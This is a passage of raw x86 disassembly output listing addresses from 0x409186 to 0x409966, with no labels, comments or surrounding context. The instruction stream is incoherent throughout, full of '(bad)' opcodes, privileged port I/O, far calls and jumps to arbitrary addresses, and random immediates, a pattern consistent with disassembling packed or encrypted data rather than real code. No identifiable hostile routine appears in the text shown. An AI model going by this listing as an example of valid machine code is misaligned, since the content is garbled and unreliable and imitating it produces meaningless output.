  409186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409187:	adc    al,0xf0
  409189:	loope  0x4091f1
  40918b:	adc    al,0x2
  40918d:	sbb    DWORD PTR [eax+0x34],esp
  409190:	out    dx,al
  409191:	sbb    ch,dh
  409193:	(bad)  
  409195:	jle    0x4091fb
  409197:	push   edx
  409198:	(bad)  
  409199:	pop    edx
  40919a:	mov    dh,0xdd
  40919c:	xchg   BYTE PTR [eax+0x75b86c59],dl
  4091a2:	sti    
  4091a3:	and    DWORD PTR [edx+0x23],ebx
  4091a6:	inc    edi
  4091a7:	test   DWORD PTR [eax-0x67],edi
  4091aa:	cli    
  4091ab:	shl    BYTE PTR [esi-0x1],cl
  4091ae:	xchg   esp,eax
  4091af:	or     al,0xf8
  4091b1:	gs mov ebx,0x539b5bc6
  4091b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b8:	jle    0x40917a
  4091ba:	sub    esi,DWORD PTR [edx]
  4091bc:	jbe    0x4091c1
  4091be:	lds    ecx,FWORD PTR [edi+0x75]
  4091c1:	xchg   ebp,eax
  4091c2:	fld    QWORD PTR [edx]
  4091c4:	mov    dh,bh
  4091c6:	out    dx,al
  4091c7:	clc    
  4091c8:	inc    edi
  4091c9:	std    
  4091ca:	add    eax,0xbae091b1
  4091cf:	and    ch,ch
  4091d1:	fidiv  WORD PTR [edi+0x3e]
  4091d4:	ficom  WORD PTR [esi+0x4e]
  4091d7:	pop    ss
  4091d8:	sub    DWORD PTR [eax-0x44],0xe41b9ed2
  4091df:	out    0xb9,ax
  4091e2:	and    BYTE PTR cs:[eax-0x2d99b371],al
  4091e9:	ret    
  4091ea:	xor    eax,0x96a592a1
  4091ef:	mov    al,0xeb
  4091f1:	or     esp,DWORD PTR [edx-0x7d]
  4091f4:	mov    ebx,0x19207f9c
  4091f9:	mov    ebp,0xd5d14eaa
  4091fe:	cwde   
  4091ff:	fst    st(0)
  409201:	xor    al,0x5c
  409203:	aaa    
  409204:	retf   0x431d
  409207:	rcpps  xmm1,XMMWORD PTR [esi+esi*2]
  40920b:	dec    edi
  40920c:	push   ebp
  40920d:	or     ecx,ebp
  40920f:	mov    ebp,0x6c448f26
  409214:	push   ss
  409215:	xchg   ecx,eax
  409216:	mov    ah,BYTE PTR [ebp+esi*4-0x22]
  40921a:	add    dl,BYTE PTR [eax+0x3e]
  40921d:	(bad)  
  40921e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40921f:	aaa    
  409220:	cwde   
  409221:	shr    DWORD PTR [edi-0x1b],0x9c
  409225:	mov    ebp,DWORD PTR [ebx]
  409227:	mov    ds:0xa779cafb,eax
  40922c:	pushf  
  40922d:	dec    esi
  40922e:	pop    es
  40922f:	inc    edx
  409230:	clc    
  409231:	sub    al,0xae
  409233:	imul   ebx,esp,0xdc19f8d9
  409239:	push   ds
  40923a:	mov    ds:0x7cc1118a,al
  40923f:	fiadd  DWORD PTR [esi+0x78]
  409242:	cli    
  409243:	lods   al,BYTE PTR ds:[esi]
  409244:	jle    0x4091f9
  409246:	popf   
  409247:	aas    
  409248:	push   ebx
  409249:	inc    esp
  40924a:	and    eax,0x9f43780e
  40924f:	outs   dx,DWORD PTR ds:[esi]
  409250:	out    dx,eax
  409251:	sbb    ebp,esi
  409253:	push   edx
  409254:	mov    ebp,0xcc0a7f2e
  409259:	add    BYTE PTR [esi+0x216d1288],bh
  40925f:	dec    ecx
  409260:	mov    ebx,0xcd708a4b
  409265:	sar    DWORD PTR [edx-0x2eb5ca9c],0x7c
  40926c:	mov    ecx,0xd08dfbf7
  409271:	fwait
  409272:	test   BYTE PTR [eax+0xf408f35],0x96
  409279:	cdq    
  40927a:	sbb    BYTE PTR [eax+eax*4+0xf],ah
  40927e:	dec    eax
  40927f:	sbb    eax,0x3cad90bd
  409284:	adc    eax,0x9269f3fa
  409289:	add    eax,0xaf44ca5f
  40928e:	mov    ds:0x9828921,eax
  409293:	in     eax,0xe6
  409295:	push   ebx
  409296:	mov    ebx,0xd5f27e67
  40929b:	popf   
  40929c:	lods   al,BYTE PTR ds:[esi]
  40929d:	inc    edx
  40929e:	or     al,0xae
  4092a0:	je     0x409294
  4092a2:	ins    DWORD PTR es:[edi],dx
  4092a3:	ret    0x7d95
  4092a6:	sbb    bl,dl
  4092a8:	mov    eax,0x2e9199a6
  4092ad:	std    
  4092ae:	fisttp DWORD PTR [esi+ebx*1-0x6bce70a1]
  4092b5:	sbb    al,dh
  4092b7:	mov    al,0x58
  4092b9:	(bad)  
  4092ba:	repz rcl DWORD PTR ss:[eax],0xbb
  4092bf:	(bad)  
  4092c0:	jns    0x409312
  4092c2:	loope  0x4092b1
  4092c4:	mov    ch,0x14
  4092c6:	pop    ecx
  4092c7:	in     al,dx
  4092c8:	xchg   esp,eax
  4092c9:	mov    bl,0x3c
  4092cb:	xchg   ebx,eax
  4092cc:	into   
  4092cd:	lods   eax,DWORD PTR ds:[esi]
  4092ce:	mov    al,ds:0xbb581d5c
  4092d3:	lds    ecx,FWORD PTR [ecx]
  4092d5:	xchg   DWORD PTR [ebx+0x19],edx
  4092d8:	sub    eax,DWORD PTR [esp+edx*4-0xd]
  4092dc:	adc    BYTE PTR [edi+esi*1-0x24e61e44],bl
  4092e3:	jbe    0x4092a6
  4092e5:	fistp  WORD PTR [edx+0xe]
  4092e8:	outs   dx,BYTE PTR ds:[esi]
  4092e9:	lds    eax,FWORD PTR [esi+edx*1-0x48]
  4092ed:	cmp    al,0x9
  4092ef:	sbb    edx,DWORD PTR [edx]
  4092f1:	outs   dx,BYTE PTR ds:[esi]
  4092f2:	lahf   
  4092f3:	add    ebx,DWORD PTR [ebx+esi*2+0x7a91ac63]
  4092fa:	xor    BYTE PTR ds:0x30b03b79,dl
  409300:	cmp    edi,edi
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	(bad)  
  40932e:	bound  edi,QWORD PTR [edx+esi*1+0x27]
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x4093af
  40933a:	cmp    esp,DWORD PTR [eax]
  40933c:	add    bl,BYTE PTR [ebx+0x7ecb21f8]
  409342:	xchg   edx,eax
  409343:	add    DWORD PTR [edi],edx
  409345:	stos   DWORD PTR es:[edi],eax
  409346:	adc    bh,BYTE PTR [esi-0x3d605842]
  40934c:	inc    esp
  40934d:	cdq    
  40934e:	push   ss
  40934f:	mov    edx,0xfac06ba6
  409354:	mov    cs,WORD PTR [edi]
  409356:	int    0x49
  409358:	cdq    
  409359:	mov    al,ds:0x56e9774a
  40935e:	(bad)  
  40935f:	ss add al,0x1a
  409362:	jbe    0x4092ec
  409364:	in     eax,0x1d
  409366:	xchg   esp,eax
  409367:	push   esi
  409368:	xchg   esi,eax
  409369:	repnz leave 
  40936b:	cmc    
  40936c:	adc    edi,ebp
  40936e:	add    bl,bh
  409370:	(bad)  
  409371:	call   0x229a861a
  409376:	push   0xd1515625
  40937b:	push   cs
  40937c:	inc    ebp
  40937d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40937e:	cld    
  40937f:	xchg   DWORD PTR [ebp+0x55],edx
  409382:	mov    ecx,0x2e3be3ee
  409387:	push   ecx
  409388:	mov    ch,0x42
  40938a:	ret    0x66ac
  40938d:	iret   
  40938e:	jne    0x409403
  409390:	jns    0x40939b
  409392:	jg     0x40939f
  409394:	pop    ss
  409395:	lahf   
  409396:	lahf   
  409397:	mov    edi,0xda7118d
  40939c:	outs   dx,BYTE PTR ds:[esi]
  40939d:	pop    esi
  40939e:	and    esp,DWORD PTR [edi+0x19]
  4093a1:	addr16 jae 0x409337
  4093a4:	and    al,0xde
  4093a6:	ror    DWORD PTR [ebx],0xed
  4093a9:	jo     0x4093b9
  4093ab:	icebp  
  4093ac:	mov    ch,0x8d
  4093ae:	clc    
  4093af:	mov    eax,esp
  4093b1:	fdiv   DWORD PTR [ebx-0x2bd6f99]
  4093b7:	jl     0x409427
  4093b9:	xor    esi,ebx
  4093bb:	pop    ss
  4093bc:	pop    esi
  4093bd:	cmp    BYTE PTR [edi+0x21280cf8],cl
  4093c3:	sbb    eax,0x879cafc0
  4093c8:	mov    ah,0x5b
  4093ca:	sbb    DWORD PTR [ebx+edx*1],ebx
  4093cd:	mov    ds:0xee64fddd,eax
  4093d2:	sbb    ah,BYTE PTR [ebx+0x7a]
  4093d5:	or     al,0x29
  4093d7:	add    ebx,DWORD PTR [esi]
  4093d9:	out    dx,eax
  4093da:	adc    edx,DWORD PTR [ebp-0x30d19804]
  4093e0:	add    al,0x58
  4093e2:	dec    edx
  4093e3:	jb     0x409377
  4093e5:	seto   BYTE PTR [eax+0x27768fe]
  4093ec:	(bad)  
  4093ed:	addr16 push esp
  4093ef:	fisubr DWORD PTR [ecx-0x43310ddc]
  4093f5:	or     al,0xd4
  4093f7:	push   ss
  4093f8:	int3   
  4093f9:	and    al,0x2f
  4093fb:	adc    esp,DWORD PTR [esi]
  4093fd:	inc    ecx
  4093fe:	jp     0x4093af
  409400:	pusha  
  409401:	push   edx
  409402:	xchg   ecx,eax
  409403:	sub    ebp,esp
  409405:	jae    0x4093cd
  409407:	push   edx
  409408:	ror    BYTE PTR [esi+0xa9a9eb0],cl
  40940e:	cdq    
  40940f:	pop    esi
  409410:	xor    BYTE PTR [eax+edx*1-0x4a],0xc5
  409415:	ins    DWORD PTR es:[edi],dx
  409416:	out    dx,eax
  409417:	out    dx,al
  409418:	pop    es
  409419:	cmp    al,0x5b
  40941b:	lea    ebp,[eax+edx*4+0x7071e863]
  409422:	push   0xaaf6a051
  409427:	mov    eax,ss
  409429:	jp     0x4093d7
  40942b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40942c:	xchg   bl,cl
  40942e:	pusha  
  40942f:	adc    al,0x92
  409431:	rcr    BYTE PTR [edx+0x3844a41c],cl
  409437:	aam    0x1e
  409439:	lahf   
  40943a:	pop    edi
  40943b:	imul   ecx,DWORD PTR [eax+ebp*4+0x573014bb],0xffffffa6
  409443:	xchg   DWORD PTR [eax+0x45],edx
  409446:	jle    0x4094aa
  409448:	les    ebp,FWORD PTR [esi+0x746fd0b5]
  40944e:	into   
  40944f:	jge    0x4093dd
  409451:	je     0x40941a
  409453:	cwde   
  409454:	xchg   edx,eax
  409455:	mov    BYTE PTR [edx+eiz*2],cl
  409458:	hlt    
  409459:	adc    al,0x6b
  40945b:	jb     0x4094b2
  40945d:	add    eax,0xf5495b2
  409462:	(bad)  
  409463:	mov    dh,0x5f
  409465:	push   0x29
  409467:	xor    DWORD PTR [esi+0x42bdeb49],esp
  40946d:	or     eax,0x23c7b9a4
  409472:	mov    ch,0xa1
  409474:	and    DWORD PTR [ebx],ecx
  409476:	mov    ebx,0x5f4b55cb
  40947b:	jmp    0xd31882e3
  409480:	call   0xa6f3caa3
  409485:	mov    ch,BYTE PTR [ebp+0x6]
  409488:	xchg   bl,ah
  40948a:	pop    ebx
  40948b:	scas   al,BYTE PTR es:[edi]
  40948c:	mov    ebp,0x49e09167
  409491:	fwait
  409492:	ror    BYTE PTR [edx+0x248d8921],cl
  409498:	out    dx,al
  409499:	fnstsw WORD PTR cs:[edx+ebx*4-0x31e2a794]
  4094a1:	das    
  4094a2:	sbb    al,0x36
  4094a4:	push   cs
  4094a5:	jle    0x4094f3
  4094a7:	pop    esp
  4094a8:	iret   
  4094a9:	int3   
  4094aa:	adc    ah,bh
  4094ac:	(bad)  
  4094ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094af:	(bad)  
  4094b0:	retf   
  4094b1:	adc    DWORD PTR [edi+0x2b934971],edi
  4094b7:	lods   eax,DWORD PTR ds:[esi]
  4094b8:	and    al,0x88
  4094ba:	pop    edx
  4094bb:	jno    0x4094a2
  4094bd:	lea    ebp,[ebp-0x5d]
  4094c0:	cmp    DWORD PTR [esi+0x781ca5a5],ebx
  4094c6:	es stos DWORD PTR es:[edi],eax
  4094c8:	sub    DWORD PTR ds:0x95be2ed7,ecx
  4094ce:	xchg   ebp,eax
  4094cf:	sti    
  4094d0:	mov    ds:0x7b04b9f4,eax
  4094d5:	and    eax,0x3a8bb6fe
  4094da:	and    al,0xf7
  4094dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094dd:	jns    0x4094d2
  4094df:	inc    esi
  4094e0:	dec    ebp
  4094e1:	pop    eax
  4094e2:	inc    eax
  4094e3:	js     0x40955b
  4094e5:	xor    eax,0x2a268ab1
  4094ea:	out    0x35,al
  4094ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094ed:	pop    esp
  4094ee:	and    eax,0x854ae4d9
  4094f3:	into   
  4094f4:	loope  0x409527
  4094f6:	xor    esp,edi
  4094f8:	lods   eax,DWORD PTR ds:[esi]
  4094f9:	jbe    0x4094ea
  4094fb:	call   0x4c0e9819
  409500:	xchg   esi,eax
  409501:	gs repnz adc al,0xcc
  409505:	jmp    0xf603bd72
  40950a:	pop    ebx
  40950b:	jmp    0x4094d7
  40950d:	cs cmc 
  40950f:	outs   dx,DWORD PTR ds:[esi]
  409510:	fwait
  409511:	jge    0x40950c
  409513:	test   eax,esp
  409515:	sbb    ah,cl
  409517:	mov    esp,0x10fc7f8c
  40951c:	xor    dl,BYTE PTR [esi+0x2af95f97]
  409522:	stos   BYTE PTR es:[edi],al
  409523:	int3   
  409524:	(bad)  
  409525:	and    DWORD PTR [edx-0x7a5ac50b],edx
  40952b:	jne    0x409505
  40952d:	int    0x9e
  40952f:	clc    
  409530:	or     al,ch
  409532:	retf   0xd4ad
  409535:	call   0xa80a:0xa67366a7
  40953c:	adc    ah,BYTE PTR [ecx+0x612a47d6]
  409542:	stos   BYTE PTR es:[edi],al
  409543:	das    
  409544:	(bad)  
  409546:	clc    
  409547:	jecxz  0x4094e1
  409549:	adc    BYTE PTR [edx+0x219fa318],bl
  40954f:	xchg   ebx,eax
  409550:	sbb    DWORD PTR [ebp+0x4b],esi
  409553:	addr16 cmp al,0xe0
  409556:	fwait
  409557:	les    esp,FWORD PTR [edx]
  409559:	(bad)  
  40955a:	cmp    eax,0x2213ca6
  40955f:	pop    es
  409560:	xchg   BYTE PTR [ebp+edx*2+0x34],bh
  409564:	into   
  409565:	lods   eax,DWORD PTR ds:[esi]
  409566:	imul   ecx,eax,0xe7eec342
  40956c:	das    
  40956d:	xchg   edx,eax
  40956e:	pushf  
  40956f:	and    DWORD PTR [eax+0x36],esp
  409572:	add    DWORD PTR [ebp-0x4a],esp
  409575:	sub    al,0x18
  409577:	rsm    
  409579:	pop    ebp
  40957a:	cmp    DWORD PTR [esp+edx*8+0x1fb7821f],ebp
  409581:	in     eax,dx
  409582:	adc    eax,0xe0920481
  409587:	or     dh,BYTE PTR [edx]
  409589:	arpl   WORD PTR [ebx-0x76ded08c],ax
  40958f:	or     BYTE PTR [esi],al
  409591:	mov    ebp,0xb924bdd4
  409596:	add    DWORD PTR [edi+0x7365a69c],esi
  40959c:	inc    ecx
  40959d:	push   ebp
  40959e:	ins    DWORD PTR es:[edi],dx
  40959f:	imul   ecx,DWORD PTR [edi-0x475e1df],0x8dedc40a
  4095a9:	adc    BYTE PTR [edx+0x5d],dl
  4095ac:	adc    dl,BYTE PTR [ecx]
  4095ae:	scas   eax,DWORD PTR es:[edi]
  4095af:	xchg   DWORD PTR [edi+ebp*2],eax
  4095b2:	fstp   QWORD PTR [edi+0x3f]
  4095b5:	rcr    BYTE PTR [ecx],cl
  4095b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b8:	dec    esp
  4095b9:	iret   
  4095ba:	pop    eax
  4095bb:	fst    QWORD PTR [ebp+0x3c]
  4095be:	or     DWORD PTR [esi+0x7bd5de2e],eax
  4095c4:	retf   0x1503
  4095c7:	loop   0x4095c9
  4095c9:	jp     0x40954f
  4095cb:	mov    DWORD PTR [ebx+0x3c],esp
  4095ce:	int3   
  4095cf:	add    edx,DWORD PTR [ebx+0x3b]
  4095d2:	adc    bh,dh
  4095d4:	jg     0x4095f5
  4095d6:	push   ss
  4095d7:	mov    DWORD PTR [ecx],esp
  4095d9:	ins    DWORD PTR es:[edi],dx
  4095da:	or     bl,BYTE PTR [ecx-0x57]
  4095dd:	mov    edx,0x2d0b66f9
  4095e2:	fnsave [edx]
  4095e4:	adc    DWORD PTR [edi+ebp*2],0x399729b5
  4095eb:	dec    esi
  4095ec:	cmp    ecx,ebx
  4095ee:	adc    eax,0x11454661
  4095f3:	ror    BYTE PTR [ebx],0x7f
  4095f6:	imul   ebx,DWORD PTR [ebx-0x56],0xb7bfbca9
  4095fd:	push   0x2fb5f4b
  409602:	data16 rcr BYTE PTR [edx],1
  409605:	sbb    eax,DWORD PTR [esi-0x67]
  409608:	add    BYTE PTR [ebx-0x12],0xdf
  40960c:	xchg   ebp,eax
  40960d:	xchg   DWORD PTR [edx+0x2f],edx
  409610:	test   eax,0xe15dabd3
  409615:	lahf   
  409616:	mov    bh,0x1d
  409618:	xchg   dh,cl
  40961a:	mov    ebx,0xf5df4b77
  40961f:	dec    eax
  409620:	outs   dx,DWORD PTR ds:[esi]
  409621:	sbb    BYTE PTR [ebp+0xb],ch
  409624:	loope  0x4095e4
  409626:	scas   eax,DWORD PTR es:[edi]
  409627:	xor    DWORD PTR [eax-0x7adfc0f5],edx
  40962d:	inc    esi
  40962e:	pop    ecx
  40962f:	lods   al,BYTE PTR ds:[esi]
  409630:	mov    eax,0xe4f9cb21
  409635:	push   ds
  409636:	(bad)
  40963a:	sbb    BYTE PTR [edx-0x137a396a],bh
  409640:	add    BYTE PTR [ebp-0x32aeab2b],dl
  409646:	add    al,0x6b
  409648:	cmp    DWORD PTR [edi-0x3b6c2127],ecx
  40964e:	es pop ebp
  409650:	xchg   ecx,eax
  409651:	and    BYTE PTR [edi+0x27f89e39],bl
  409657:	push   ds
  409658:	shl    BYTE PTR ss:[esi-0x54a235f0],1
  40965f:	mov    ch,ah
  409661:	sti    
  409662:	push   0x40
  409664:	sbb    bl,BYTE PTR [eax]
  409666:	inc    ebx
  409667:	aaa    
  409668:	sar    edi,0x50
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [eax],edx
  409687:	jl     0x409661
  409689:	outs   dx,BYTE PTR ds:[esi]
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40963d
  409693:	imul   ebx,DWORD PTR [ecx+0x62],0x59
  409697:	int3   
  409698:	out    0x64,al
  40969a:	pop    edx
  40969b:	sahf   
  40969c:	jbe    0x4096a8
  40969e:	xchg   ecx,eax
  40969f:	xor    ch,BYTE PTR [ecx-0x35]
  4096a2:	enter  0xdaa6,0xa7
  4096a6:	cdq    
  4096a7:	jbe    0x409665
  4096a9:	call   0x6d0f632b
  4096ae:	rol    DWORD PTR [eax],cl
  4096b0:	mov    WORD PTR ds:0x9c344f2d,ds
  4096b6:	push   ebx
  4096b7:	adc    dh,BYTE PTR [ebx+0x53]
  4096ba:	mov    eax,0xafaac59e
  4096bf:	es push ss
  4096c1:	imul   edx,DWORD PTR ds:0x36ae9399,0x2e
  4096c8:	fidiv  WORD PTR [ecx-0x3081813c]
  4096ce:	adc    esp,DWORD PTR [edx]
  4096d0:	cmovle edi,DWORD PTR [ebx]
  4096d3:	sbb    eax,0xce293193
  4096d8:	jle    0x4096c0
  4096da:	test   DWORD PTR [ebp-0x197c486],0x7515d6b8
  4096e4:	(bad)  [edi+eax*2-0x2c16978d]
  4096eb:	sub    eax,0x7e1f1ef7
  4096f0:	je     0x409706
  4096f2:	add    eax,0xf03467a3
  4096f7:	mov    bh,0xa3
  4096f9:	cli    
  4096fa:	outs   dx,DWORD PTR ds:[esi]
  4096fb:	imul   ebp,DWORD PTR [edi+eiz*1-0x37c2053b],0x4574d7f3
  409706:	ins    DWORD PTR es:[edi],dx
  409707:	jb     0x409718
  409709:	fnstsw WORD PTR [eax+eiz*2]
  40970c:	int3   
  40970d:	and    BYTE PTR [edi+0x3ba130e9],al
  409713:	xchg   esi,eax
  409714:	fcomp  QWORD PTR [edi+0x14e8a761]
  40971a:	fldenv [ebx+0x2]
  40971d:	inc    ebx
  40971e:	jl     0x4096d7
  409720:	sbb    BYTE PTR [ebx+0x57],dh
  409723:	nop
  409724:	pop    ebp
  409725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409726:	xor    BYTE PTR [edx+0x47b6a524],cl
  40972c:	fsub   DWORD PTR [edx]
  40972e:	jne    0x4097a6
  409730:	inc    edi
  409731:	cmp    eax,0xc0036e13
  409736:	std    
  409737:	adc    al,0x56
  409739:	add    BYTE PTR [ebx],dh
  40973b:	adc    DWORD PTR [edi-0x79],esp
  40973e:	imul   esp,DWORD PTR [ebx+0x66],0x401465c
  409745:	mov    ds:0xd366f777,al
  40974a:	push   ebx
  40974b:	dec    ecx
  40974c:	cmp    ecx,0xe1f7ae5e
  409752:	dec    edx
  409753:	pop    esp
  409754:	pop    ss
  409755:	call   0x18e09a82
  40975a:	lock pop eax
  40975c:	fisttp QWORD PTR [ebp+esi*4-0x17]
  409760:	mov    eax,0x24ae67ee
  409765:	bound  eax,QWORD PTR [edi]
  409767:	fiadd  DWORD PTR [eax]
  409769:	inc    esp
  40976a:	jns    0x4096f4
  40976c:	jb     0x409762
  40976e:	mov    al,0x9d
  409770:	cmc    
  409771:	sub    ah,BYTE PTR [ebx-0x58]
  409774:	dec    ecx
  409775:	je     0x40978c
  409777:	jno    0x4097c5
  409779:	cmp    BYTE PTR [ebx-0x4e51360f],bl
  40977f:	stos   DWORD PTR es:[edi],eax
  409780:	adc    dl,BYTE PTR [esi+0x1a7f5510]
  409786:	popf   
  409787:	pop    ebp
  409788:	mov    ebx,eax
  40978a:	hlt    
  40978b:	ss fdivr st(7),st
  40978e:	retf   0x3abb
  409791:	cmp    BYTE PTR [ecx-0x3f],0x2f
  409795:	xchg   edx,eax
  409796:	or     BYTE PTR [eax+0xc91f82f],0xf3
  40979d:	iret   
  40979e:	xchg   esp,eax
  40979f:	shl    DWORD PTR [ebx],1
  4097a1:	cmp    al,bh
  4097a3:	mov    edx,0x974584b9
  4097a8:	aad    0x63
  4097aa:	add    eax,DWORD PTR [eax]
  4097ac:	in     al,0xc3
  4097ae:	cld    
  4097af:	or     BYTE PTR [eax-0x4407c2c8],ah
  4097b5:	sbb    DWORD PTR [ecx],ebx
  4097b7:	sub    DWORD PTR [edx-0x53869ee9],esp
  4097bd:	dec    esp
  4097be:	in     eax,0x9d
  4097c0:	fwait
  4097c1:	push   es
  4097c2:	sub    esi,DWORD PTR es:[esp+ebp*8]
  4097c6:	mov    dl,0xfe
  4097c8:	popa   
  4097c9:	sahf   
  4097ca:	rol    bh,0xaf
  4097cd:	jmp    0x4097b2
  4097cf:	sub    DWORD PTR [edx],ecx
  4097d1:	das    
  4097d2:	mov    al,0xe9
  4097d4:	xchg   DWORD PTR [eax*8-0x6f0ef98e],ebp
  4097db:	loopne 0x409840
  4097dd:	sbb    ch,ch
  4097df:	sbb    ebp,DWORD PTR [eax+0x50db1c8b]
  4097e5:	stc    
  4097e6:	add    DWORD PTR [edx-0x5d],edi
  4097e9:	mov    ds:0x359f26fd,al
  4097ee:	lahf   
  4097ef:	pop    edx
  4097f0:	inc    eax
  4097f1:	mov    bl,0x4d
  4097f3:	data16 in al,0xeb
  4097f6:	inc    eax
  4097f7:	adc    DWORD PTR [ecx+0x6b],0x57bf958a
  4097fe:	out    0xdd,al
  409800:	push   es
  409801:	push   ebx
  409802:	loopne 0x409803
  409804:	hlt    
  409805:	sub    edi,eax
  409807:	jmp    0x4097f1
  409809:	ror    DWORD PTR [ecx-0x20d9a5a7],cl
  40980f:	pop    es
  409810:	icebp  
  409811:	lahf   
  409812:	dec    ebx
  409813:	add    bh,BYTE PTR [ebp-0x4a]
  409816:	sbb    esi,DWORD PTR [esi-0x45529bed]
  40981c:	(bad)  
  40981d:	adc    eax,0x47c05935
  409822:	mov    ds:0xa27cc2be,eax
  409827:	push   esi
  409828:	jbe    0x409875
  40982a:	sub    al,0xd4
  40982c:	ins    DWORD PTR es:[edi],dx
  40982d:	fstp   DWORD PTR [edx+eax*4]
  409830:	mov    dh,BYTE PTR [ebx]
  409832:	add    DWORD PTR [esp+eiz*2],ebx
  409835:	push   eax
  409836:	pop    ds
  409837:	jbe    0x409805
  409839:	aaa    
  40983a:	(bad)  
  40983b:	out    0xe,al
  40983d:	adc    ah,BYTE PTR [esp+eax*1-0x7c0efb03]
  409844:	inc    edi
  409845:	scas   al,BYTE PTR es:[edi]
  409846:	shl    BYTE PTR [edx-0x2ec4e067],0x8d
  40984d:	scas   al,BYTE PTR es:[edi]
  40984e:	dec    esp
  40984f:	es call 0x2afe:0xb00d067f
  409857:	enter  0x2c12,0xad
  40985b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40985c:	add    DWORD PTR [ebx+ebx*4-0x7d7b7bfe],0xbdf45366
  409867:	ficomp DWORD PTR [ecx+ebx*1-0x6c07c699]
  40986e:	div    DWORD PTR [ecx+esi*8-0x2e]
  409872:	out    dx,al
  409873:	cdq    
  409874:	cli    
  409875:	mov    ebx,DWORD PTR [eax+0x20]
  409878:	jl     0x4098b5
  40987a:	pop    edx
  40987b:	test   DWORD PTR [ecx-0x2be5543b],0x92f932f6
  409885:	sub    eax,0x12641181
  40988a:	xchg   esp,eax
  40988b:	loopne 0x409819
  40988d:	sbb    ebx,eax
  40988f:	jnp    0x409875
  409891:	cli    
  409892:	pop    edx
  409893:	or     dl,BYTE PTR [ebp+esi*1-0xe6f96e5]
  40989a:	sub    ch,BYTE PTR [ebp-0x57]
  40989d:	iret   
  40989e:	sahf   
  40989f:	loopne 0x4098e7
  4098a1:	test   eax,0xe5aa2b01
  4098a6:	lock into 
  4098a8:	xlat   BYTE PTR ds:[ebx]
  4098a9:	push   ecx
  4098aa:	nop
  4098ab:	in     al,dx
  4098ac:	cli    
  4098ad:	xchg   esp,eax
  4098ae:	pop    ss
  4098af:	mov    esp,0x1d8cd907
  4098b4:	loop   0x409868
  4098b6:	je     0x40989e
  4098b8:	sub    dh,dh
  4098ba:	adc    cl,BYTE PTR [eax-0x2c]
  4098bd:	push   ss
  4098be:	pop    edi
  4098bf:	sti    
  4098c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c1:	xchg   ebx,eax
  4098c2:	test   BYTE PTR ds:0x7c95c015,dh
  4098c8:	popf   
  4098c9:	push   0xeba161da
  4098ce:	xor    BYTE PTR [edx],0xf6
  4098d1:	pop    esi
  4098d2:	mov    edi,0xc6289366
  4098d7:	imul   ebp,DWORD PTR [esi-0x39],0x66
  4098db:	test   BYTE PTR [edi-0x17],0x2d
  4098df:	push   es
  4098e0:	push   0x60
  4098e2:	ss ret 0x6f74
  4098e6:	sar    DWORD PTR [edx-0x18977b73],0xbb
  4098ed:	mov    al,0x73
  4098ef:	mov    esi,0xd16b4669
  4098f4:	xor    al,0x5d
  4098f6:	scas   eax,DWORD PTR es:[edi]
  4098f7:	sub    ebp,ebx
  4098f9:	sub    al,BYTE PTR [ecx]
  4098fb:	test   BYTE PTR [ecx-0x4454364d],bl
  409901:	scas   al,BYTE PTR es:[edi]
  409902:	lods   al,BYTE PTR ds:[esi]
  409903:	sub    esi,DWORD PTR [edi+0x58]
  409906:	push   esp
  409907:	cld    
  409908:	aas    
  409909:	jl     0x409890
  40990b:	dec    edi
  40990c:	mov    esi,0x3a26a2b2
  409911:	mov    ebp,0xbad55f1d
  409916:	mov    al,ds:0x13ed7eae
  40991b:	mov    ecx,0x56094a48
  409920:	pop    ds
  409921:	push   ebx
  409922:	mov    BYTE PTR [esi-0x2d],ah
  409925:	sbb    al,0x1
  409927:	pop    edi
  409928:	lods   eax,DWORD PTR ss:[esi]
  40992a:	stos   DWORD PTR es:[edi],eax
  40992b:	push   edi
  40992c:	cdq    
  40992d:	retf   
  40992e:	mov    ebp,0x7b3f8b36
  409933:	pop    es
  409934:	push   0xffffffd5
  409936:	mov    BYTE PTR [esi],cl
  409938:	sbb    DWORD PTR [ecx-0x7e],esi
  40993b:	dec    edx
  40993c:	mov    BYTE PTR [ebx],cl
  40993e:	add    bl,cl
  409940:	out    dx,al
  409941:	push   ds
  409942:	cmp    eax,0x1ac2ddd5
  409947:	xchg   DWORD PTR [edx-0x15230f40],esp
  40994d:	pop    ebx
  40994e:	lods   al,BYTE PTR ds:[esi]
  40994f:	inc    esp
  409950:	mov    cl,BYTE PTR [ebp-0x1a808ed0]
  409956:	fst    st(0)
  409958:	mov    cl,0xf9
  40995a:	ds push es
  40995c:	and    BYTE PTR [esi],al
  40995e:	or     BYTE PTR [ecx-0x64026ce3],ch
  409964:	gs retf 
  409966:	mov    ds:0xfcf98593,eax
